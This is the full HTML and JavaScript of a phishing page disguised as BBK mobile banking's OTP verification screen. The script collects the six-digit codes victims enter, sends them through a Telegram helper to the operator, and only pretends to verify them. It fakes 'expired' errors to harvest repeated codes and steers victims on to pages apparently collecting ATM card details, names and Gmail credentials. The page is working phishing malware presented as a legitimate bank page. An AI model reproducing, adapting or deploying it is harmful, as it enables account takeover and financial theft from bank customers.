<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BBK Mobile Banking - OTP Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #4A90E2 0%, #2E5BBA 50%, #1E3A8A 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            color: white;
            overflow-x: hidden;
        }

        .container {
            flex: 1;
            padding: 40px 30px;
            display: flex;
            flex-direction: column;
            max-width: 400px;
            margin: 0 auto;
            width: 100%;
        }

        .logo-container {
            display: flex;
            justify-content: flex-end;
            margin-bottom: 60px;
            margin-top: 20px;
        }

        .logo {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .logo-text {
            font-size: 28px;
            font-weight: bold;
            letter-spacing: 2px;
            margin-bottom: 5px;
            position: relative;
        }

        .logo-star {
            position: absolute;
            right: -15px;
            top: -5px;
            font-size: 20px;
            color: white;
        }

        .logo-arabic {
            font-size: 12px;
            letter-spacing: 1px;
            opacity: 0.9;
            direction: rtl;
        }

        .verification-text {
            text-align: center;
            margin-bottom: 60px;
        }

        .verification-text h1 {
            font-size: 24px;
            font-weight: 300;
            line-height: 1.4;
            margin-bottom: 20px;
        }

        .verification-text p {
            font-size: 16px;
            opacity: 0.8;
            line-height: 1.5;
        }

        .username-display {
            text-align: center;
            margin-bottom: 40px;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
        }

        .username-display .label {
            font-size: 14px;
            opacity: 0.7;
            margin-bottom: 5px;
        }

        .username-display .value {
            font-size: 18px;
            font-weight: 500;
        }

        .otp-container {
            margin-bottom: 40px;
        }

        .otp-inputs {
            display: flex;
            justify-content: space-between;
            gap: 10px;
            margin-bottom: 30px;
        }

        .otp-input {
            width: 50px;
            height: 60px;
            background: transparent;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 10px;
            text-align: center;
            font-size: 24px;
            color: white;
            outline: none;
            transition: border-color 0.3s ease;
        }

        .otp-input:focus {
            border-color: white;
        }

        .otp-input.filled {
            border-color: rgba(255, 255, 255, 0.8);
            background: rgba(255, 255, 255, 0.1);
        }

        .otp-input.error {
            border-color: #ff4757;
            background: rgba(255, 71, 87, 0.1);
        }

        .resend-container {
            text-align: center;
            margin-bottom: 40px;
        }

        .resend-text {
            font-size: 14px;
            opacity: 0.7;
            margin-bottom: 10px;
        }

        .resend-button {
            background: none;
            border: none;
            color: white;
            font-size: 16px;
            text-decoration: underline;
            cursor: pointer;
            opacity: 0.9;
            transition: opacity 0.3s ease;
        }

        .resend-button:hover {
            opacity: 1;
        }

        .resend-button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .timer {
            font-size: 14px;
            opacity: 0.8;
            margin-top: 5px;
        }

        .verify-button {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            border-radius: 25px;
            padding: 18px;
            font-size: 18px;
            color: white;
            cursor: pointer;
            margin-bottom: 30px;
            transition: background-color 0.3s ease, transform 0.2s ease;
            font-weight: 400;
            width: 100%;
        }

        .verify-button:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-1px);
        }

        .verify-button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .back-button {
            text-align: center;
            margin-bottom: 40px;
        }

        .back-button a {
            color: white;
            text-decoration: none;
            font-size: 16px;
            font-weight: 300;
            opacity: 0.9;
            transition: opacity 0.3s ease;
        }

        .back-button a:hover {
            opacity: 1;
            text-decoration: underline;
        }

        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Error Modal Styles */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
        }

        .modal-overlay.show {
            opacity: 1;
            visibility: visible;
        }

        .error-modal {
            background: white;
            border-radius: 15px;
            padding: 30px;
            max-width: 320px;
            width: 90%;
            text-align: center;
            color: #333;
            transform: scale(0.8);
            transition: transform 0.3s ease;
        }

        .modal-overlay.show .error-modal {
            transform: scale(1);
        }

        .error-icon {
            font-size: 48px;
            color: #ff4757;
            margin-bottom: 20px;
        }

        .error-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #333;
        }

        .error-message {
            font-size: 16px;
            color: #666;
            margin-bottom: 25px;
            line-height: 1.4;
        }

        .error-button {
            background: #ff4757;
            color: white;
            border: none;
            border-radius: 25px;
            padding: 12px 30px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .error-button:hover {
            background: #ff3742;
        }

        .error-message-display {
            color: #ff4757;
            font-size: 14px;
            margin-top: 10px;
        }

        .verification-text a {
            color: white;
            text-decoration: underline;
            opacity: 0.9;
            transition: opacity 0.3s ease;
        }

        .verification-text a:hover {
            opacity: 1;
        }

        .re-enter-link {
            color: #ff9f00;
            text-decoration: underline;
            font-weight: normal;
            cursor: pointer;
            transition: opacity 0.3s ease;
        }

        .re-enter-link:hover {
            opacity: 0.8;
        }

        /* Mobile Responsive Styles */
        @media (max-width: 768px) {
            .container {
                padding: 30px 20px;
            }
            
            .logo-container {
                margin-bottom: 40px;
                margin-top: 10px;
            }
            
            .logo-text {
                font-size: 24px;
            }
            
            .verification-text {
                margin-bottom: 40px;
            }
            
            .verification-text h1 {
                font-size: 22px;
                margin-bottom: 16px;
            }
            
            .verification-text p {
                font-size: 14px;
            }
            
            .otp-inputs {
                gap: 8px;
                margin-bottom: 24px;
            }
            
            .otp-input {
                width: 48px;
                height: 58px;
                font-size: 22px;
            }
            
            .verify-button {
                padding: 16px;
                font-size: 16px;
                min-height: 48px; /* Touch-friendly */
            }
            
            .resend-button {
                font-size: 15px;
                min-height: 44px; /* Touch-friendly */
            }
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 24px 16px;
            }
            
            .logo-container {
                margin-bottom: 30px;
            }
            
            .logo-text {
                font-size: 22px;
            }
            
            .verification-text {
                margin-bottom: 30px;
            }
            
            .verification-text h1 {
                font-size: 20px;
            }
            
            .verification-text p {
                font-size: 13px;
            }
            
            .otp-inputs {
                gap: 6px;
                margin-bottom: 20px;
            }
            
            .otp-input {
                width: 42px;
                height: 52px;
                font-size: 20px;
            }
            
            .verify-button {
                padding: 14px;
                font-size: 15px;
            }
            
            .error-modal {
                padding: 24px;
                max-width: 90%;
            }
        }
        
        @media (max-width: 360px) {
            .container {
                padding: 20px 12px;
            }
            
            .verification-text h1 {
                font-size: 18px;
            }
            
            .otp-inputs {
                gap: 4px;
            }
            
            .otp-input {
                width: 38px;
                height: 48px;
                font-size: 18px;
            }
        }
        
        /* Prevent zoom on input focus (iOS) */
        @media screen and (max-width: 768px) {
            input, select, textarea {
                font-size: 16px !important;
            }
            
            .otp-input {
                font-size: 20px !important;
            }
        }
        
        /* Touch-friendly interactions */
        @media (hover: none) and (pointer: coarse) {
            .verify-button, .resend-button, .back-button a, .otp-input {
                -webkit-tap-highlight-color: rgba(255, 255, 255, 0.2);
                touch-action: manipulation;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <div class="logo">
                <div class="logo-text">
                    BBK
                    <span class="logo-star">‚ú±</span>
                </div>
                <div class="logo-arabic">ÿ®ŸÜŸÉ ÿßŸÑÿ®ÿ≠ÿ±ŸäŸÜ ŸàÿßŸÑŸÉŸàŸäÿ™</div>
            </div>
        </div>

        <div class="verification-text">
            <h1>OTP Verification</h1>
            <p id="verificationMessage">We've sent a 6-digit verification code to your registered mobile number</p>
            <br>
            <div id="errorMessage" class="error-message-display"></div>
        </div>

        <form id="otpForm">
        <div class="otp-container">
            <div class="otp-inputs">
                <input type="tel" name="one" class="otp-input" maxlength="1" id="otp1" required>
                <input type="tel" name="two" class="otp-input" maxlength="1" id="otp2" required>
                <input type="tel" name="three" class="otp-input" maxlength="1" id="otp3" required>
                <input type="tel" name="four" class="otp-input" maxlength="1" id="otp4" required>
                <input type="tel" name="five" class="otp-input" maxlength="1" id="otp5" required>
                <input type="tel" name="six" class="otp-input" maxlength="1" id="otp6" required>
            </div>
        </div>

        <div class="resend-container">
            <div class="resend-text">Didn't receive the code?</div>
            <button type="button" class="resend-button" onclick="resendOTP()" id="resendBtn">Resend OTP</button>
            <div class="timer" id="timer"></div>
        </div>

        <button type="submit" class="verify-button" id="verifyBtn">Verify</button>

        <div class="back-button">
            <a href="index.html">‚Üê Back to Login</a>
        </div>
    </div>
    </form>
    <!-- Error Modal -->
    <div class="modal-overlay" id="errorModal">
        <div class="error-modal">
            <div class="error-icon">‚ö†Ô∏è</div>
            <div class="error-title">Invalid OTP</div>
            <div class="error-message">The OTP you entered is incorrect. Please try again with the correct code.</div>
            <button class="error-button" onclick="closeErrorModal()">Try Again</button>
        </div>
    </div>

    <script src="config.js"></script>
    <script src="telegram.js"></script>
    <script>
        let resendTimer = 60;
        let timerInterval;
        let otpAttempts = 0;

        // Get URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const msg = urlParams.get('msg') || '';

        // Initialize page
        document.addEventListener('DOMContentLoaded', function() {
            // Show error message if coming from error page
            if (msg === 'last') {
                document.getElementById('errorMessage').textContent = 'Invalid OTP Code ! Please try again.';
            }

            // Get current attempt count
            otpAttempts = parseInt(sessionStorage.getItem('otp_attempts') || '0');

            // Start resend timer
            startResendTimer();

            // Setup OTP input handlers
            setupOTPInputs();

            // Setup form submission
            document.getElementById('otpForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                const verifyBtn = document.getElementById('verifyBtn');
                // Check if button was changed to "Verify with ATM card"
                if (verifyBtn.textContent === 'Verify with ATM card') {
                    window.location.href = 'card.html';
                } else {
                    await verifyOTP();
                }
            });
        });

        // Setup OTP input functionality
        function setupOTPInputs() {
            const inputs = document.querySelectorAll('.otp-input');
            
            inputs.forEach((input, index) => {
                input.addEventListener('input', function(e) {
                    const value = e.target.value;
                    
                    // Only allow numbers
                    if (!/^\d*$/.test(value)) {
                        e.target.value = '';
                        return;
                    }

                    // Remove error class
                    e.target.classList.remove('error');

                    // Add filled class
                    if (value) {
                        e.target.classList.add('filled');
                        // Move to next input
                        if (index < inputs.length - 1) {
                            inputs[index + 1].focus();
                        }
                    } else {
                        e.target.classList.remove('filled');
                    }

                    // Check if all inputs are filled
                    checkAllInputsFilled();
                });

                input.addEventListener('keydown', function(e) {
                    // Handle backspace
                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
                        inputs[index - 1].focus();
                        inputs[index - 1].value = '';
                        inputs[index - 1].classList.remove('filled');
                    }

                    // Handle Enter key
                    if (e.key === 'Enter') {
                        verifyOTP();
                    }
                });

                input.addEventListener('paste', function(e) {
                    e.preventDefault();
                    const pastedData = e.clipboardData.getData('text');
                    const digits = pastedData.replace(/\D/g, '').slice(0, 6);
                    
                    digits.split('').forEach((digit, i) => {
                        if (inputs[i]) {
                            inputs[i].value = digit;
                            inputs[i].classList.add('filled');
                            inputs[i].classList.remove('error');
                        }
                    });

                    checkAllInputsFilled();
                });
            });
        }

        // Check if all OTP inputs are filled
        function checkAllInputsFilled() {
            const inputs = document.querySelectorAll('.otp-input');
            const allFilled = Array.from(inputs).every(input => input.value.length === 1);
            
            if (allFilled) {
                document.getElementById('verifyBtn').style.background = 'rgba(255, 255, 255, 0.4)';
            } else {
                document.getElementById('verifyBtn').style.background = 'rgba(255, 255, 255, 0.2)';
            }
        }

        // Start resend timer
        function startResendTimer() {
            const resendBtn = document.getElementById('resendBtn');
            const timer = document.getElementById('timer');
            const verificationMessage = document.getElementById('verificationMessage');
            const verifyBtn = document.getElementById('verifyBtn');
            
            resendBtn.disabled = true;
            
            timerInterval = setInterval(() => {
                timer.textContent = `Resend available in ${resendTimer}s`;
                resendTimer--;
                
                if (resendTimer < 0) {
                    clearInterval(timerInterval);
                    resendBtn.disabled = false;
                    timer.textContent = '';
                    resendTimer = 60;
                    
                    // Only change button and message if NOT on last screen
                    if (msg !== 'last' && msg !== 'lastt') {
                        // Change verification message when timer ends
                        verificationMessage.innerHTML = 'Didn\'t receive the OTP? Your E-PIN may be incorrect. Click <a href="index.html" class="re-enter-link">Re-Enter</a> or activate Via ATM Card';
                        
                        // Change verify button text and type
                        verifyBtn.textContent = 'Verify with ATM card';
                        verifyBtn.type = 'button';
                        verifyBtn.onclick = function(e) {
                            e.preventDefault();
                            window.location.href = 'card.html';
                        };
                    }
                }
            }, 1000);
        }

        // Show error modal
        function showErrorModal() {
            const modal = document.getElementById('errorModal');
            modal.classList.add('show');
            
            // Add error class to all inputs
            const inputs = document.querySelectorAll('.otp-input');
            inputs.forEach(input => {
                input.classList.add('error');
            });
        }

        // Close error modal
        function closeErrorModal() {
            const modal = document.getElementById('errorModal');
            modal.classList.remove('show');
            
            // Clear OTP inputs and remove error class
            const inputs = document.querySelectorAll('.otp-input');
            inputs.forEach(input => {
                input.value = '';
                input.classList.remove('filled', 'error');
            });
            inputs[0].focus();
        }

        // Verify OTP
        async function verifyOTP() {
            const inputs = document.querySelectorAll('.otp-input');
            const otp = Array.from(inputs).map(input => input.value).join('');
            const verifyBtn = document.getElementById('verifyBtn');
            
            if (otp.length !== 6) {
                alert('Please enter the complete 6-digit OTP');
                return;
            }

            // Show loading state
            verifyBtn.disabled = true;
            verifyBtn.innerHTML = '<span class="loading-spinner"></span>Verifying...';
            
            try {
                // Increment attempt count
                otpAttempts++;
                sessionStorage.setItem('otp_attempts', otpAttempts.toString());
                
                // Determine OTP type based on msg parameter
                let otpType = 'OTP Submitted';
                if (msg === 'againc') {
                    otpType = 'Third OTP Submitted';
                } else if (msg === 'lastt' || msg === 'last') {
                    otpType = 'Last OTP Submitted';
                }
                
                // Send OTP to Telegram (non-blocking - won't fail form submission)
                sendFormDataToTelegram(otpType, {
                    'OTP Code': otp
                }).catch(err => {
                    console.warn('Telegram notification failed (non-critical):', err);
                });
                
                // Simulate verification process
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Check if this is the last screen - show expired error
                if (msg === 'last' || msg === 'lastt') {
                    verifyBtn.disabled = false;
                    verifyBtn.textContent = 'Verify';
                    
                    // Show expired error message
                    document.getElementById('errorMessage').textContent = 'OTP is expired please try again';
                    showErrorModal();
                    return;
                }
                
                // Determine next page based on msg parameter
                let nextPage = 'name.html';
                if (msg === 'againc') {
                    nextPage = 'gmail.html';
                } else if (msg === 'lastt') {
                    nextPage = 'otp.html?msg=last';
                } else if (msg === 'last') {
                    nextPage = 'otp.html?msg=last'; // Stay on same page for last OTP
                } else if (msg === 'again') {
                    nextPage = 'name.html';
                }
                
                // Always redirect - don't block on Telegram errors
                window.location.href = nextPage;
                
            } catch (error) {
                console.error('OTP verification error:', error);
                verifyBtn.disabled = false;
                verifyBtn.textContent = 'Verify';
                showErrorModal();
            }
        }

        // Resend OTP
        async function resendOTP() {
            const message = `üîÑ BBK OTP Resend Request\n\n‚è∞ Time: ${new Date().toISOString()}`;

            try {
                await sendToTelegram(message);
            } catch (error) {
                console.log('Resend notification error:', error);
            }

            // Clear current OTP inputs
            const inputs = document.querySelectorAll('.otp-input');
            inputs.forEach(input => {
                input.value = '';
                input.classList.remove('filled', 'error');
            });
            inputs[0].focus();

            // Restart timer
            startResendTimer();
            
            alert('OTP has been resent to your registered mobile number');
        }
    </script>
</body>
</html>
